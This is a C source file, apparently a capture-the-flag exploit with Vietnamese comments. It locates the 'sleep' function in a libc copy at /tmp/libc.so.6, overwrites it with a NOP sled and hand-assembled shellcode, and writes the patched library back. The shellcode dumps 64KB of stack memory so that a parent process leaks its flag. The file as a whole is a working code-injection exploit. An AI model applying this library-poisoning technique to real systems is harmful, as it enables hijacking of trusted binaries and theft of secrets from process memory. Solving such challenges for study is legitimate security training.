// Compile: gcc -static -nostdlib -o solve solve.c
#include <elf.h>

#define O_RDONLY 0
#define O_WRONLY 1
#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_exit 60
#define __NR_nanosleep 35

char libc_buf[4 * 1024 * 1024]; // Buffer chứa libc

// --- Syscall Wrappers ---
void my_exit(int status) {
    asm volatile ("syscall" :: "a"(__NR_exit), "D"(status));
    while(1);
}

long my_write(int fd, const void *buf, unsigned long count) {
    long ret;
    asm volatile ("syscall" : "=a"(ret) : "a"(__NR_write), "D"(fd), "S"(buf), "d"(count) : "rcx", "r11", "memory");
    return ret;
}

long my_read(int fd, void *buf, unsigned long count) {
    long ret;
    asm volatile ("syscall" : "=a"(ret) : "a"(__NR_read), "D"(fd), "S"(buf), "d"(count) : "rcx", "r11", "memory");
    return ret;
}

long my_open(const char *filename, int flags, int mode) {
    long ret;
    asm volatile ("syscall" : "=a"(ret) : "a"(__NR_open), "D"(filename), "S"(flags), "d"(mode) : "rcx", "r11", "memory");
    return ret;
}

// --- Helpers ---
int my_strcmp(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) { s1++; s2++; }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

int my_strlen(const char *s) {
    int len = 0;
    while (s[len]) len++;
    return len;
}

void print(const char *s) {
    my_write(1, s, my_strlen(s));
}

void print_hex(unsigned long n) {
    char buf[32];
    int i = 0;
    if (n == 0) print("0");
    else {
        while(n > 0) {
            int d = n % 16;
            buf[i++] = (d < 10) ? (d + '0') : (d - 10 + 'a');
            n /= 16;
        }
        for(int j=0; j<i; j++) {
            char c = buf[i-1-j];
            my_write(1, &c, 1);
        }
    }
}

// --- Main Exploit ---
void _start() {
    print("[*] Exploit: Libc Poisoning with NOP Sled\n");

    int fd = my_open("/tmp/libc.so.6", O_RDONLY, 0);
    if (fd < 0) { print("[-] Open failed\n"); my_exit(1); }

    long total_read = 0;
    while(total_read < sizeof(libc_buf)) {
        long r = my_read(fd, libc_buf + total_read, sizeof(libc_buf) - total_read);
        if (r <= 0) break;
        total_read += r;
    }
    
    // Parse ELF tìm sleep
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)libc_buf;
    Elf64_Shdr *shdrs = (Elf64_Shdr *)(libc_buf + ehdr->e_shoff);
    char *strtab = 0;
    Elf64_Sym *symtab = 0;
    int num_syms = 0;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdrs[i].sh_type == SHT_DYNSYM) {
            symtab = (Elf64_Sym *)(libc_buf + shdrs[i].sh_offset);
            num_syms = shdrs[i].sh_size / sizeof(Elf64_Sym);
            strtab = (char *)(libc_buf + shdrs[shdrs[i].sh_link].sh_offset);
            break;
        }
    }

    unsigned long sleep_offset = 0;
    unsigned long sleep_size = 0;

    for (int i = 0; i < num_syms; i++) {
        char *name = strtab + symtab[i].st_name;
        if (my_strcmp(name, "sleep") == 0) {
            sleep_offset = symtab[i].st_value;
            sleep_size = symtab[i].st_size;
            break;
        }
    }

    if (!sleep_offset) { print("[-] sleep not found\n"); my_exit(1); }

    print("[+] Sleep offset: 0x"); print_hex(sleep_offset);
    print(" | Size: 0x"); print_hex(sleep_size); print("\n");

    // --- Shellcode Construction ---
    // Nhiệm vụ: Dump stack của parent process (nơi chứa flag)
    unsigned char shellcode[] = {
        // write(1, rsp, 0x10000) - Dump 64KB từ stack stack hiện tại lên trên
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, // mov rdi, 1
        0x48, 0x89, 0xe6,                         // mov rsi, rsp
        0x48, 0xc7, 0xc2, 0x00, 0x00, 0x01, 0x00, // mov rdx, 0x10000 (64KB)
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, // mov rax, 1
        0x0f, 0x05,                               // syscall
        
        // exit(0)
        0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, // mov rax, 60
        0x48, 0x31, 0xff,                         // xor rdi, rdi
        0x0f, 0x05                                // syscall
    };

    // --- NOP Sled Injection ---
    // Nếu sleep_size quá nhỏ, ta có thể ghi lấn sang hàm kế tiếp (không sao cả)
    // Ghi NOP (0x90) vào 200 bytes bắt đầu từ sleep_offset
    int patch_size = 200; 
    
    // 1. Fill NOPs
    for (int i = 0; i < patch_size; i++) {
        libc_buf[sleep_offset + i] = 0x90;
    }

    // 2. Đặt shellcode ở CUỐI vùng patch
    // Để đảm bảo return address (nằm ở đầu hàm) rơi vào NOP
    int start_shellcode = patch_size - sizeof(shellcode);
    for (int i = 0; i < sizeof(shellcode); i++) {
        libc_buf[sleep_offset + start_shellcode + i] = shellcode[i];
    }

    print("[*] Writing NOP sled + Shellcode...\n");

    // Ghi đè lại file libc
    int fd_out = my_open("/tmp/libc.so.6", O_WRONLY, 0);
    if (fd_out < 0) { print("[-] Write open failed\n"); my_exit(1); }

    long total_written = 0;
    while(total_written < total_read) {
        long w = my_write(fd_out, libc_buf + total_written, total_read - total_written);
        if (w <= 0) break;
        total_written += w;
    }

    print("[+] Done. Flag incoming...\n");

    // Sleep để giữ connection, chờ parent dump flag
    struct { long tv_sec; long tv_nsec; } req = { 10, 0 };
    asm volatile ("syscall" :: "a"(__NR_nanosleep), "D"(&req), "S"(0));

    my_exit(0);
}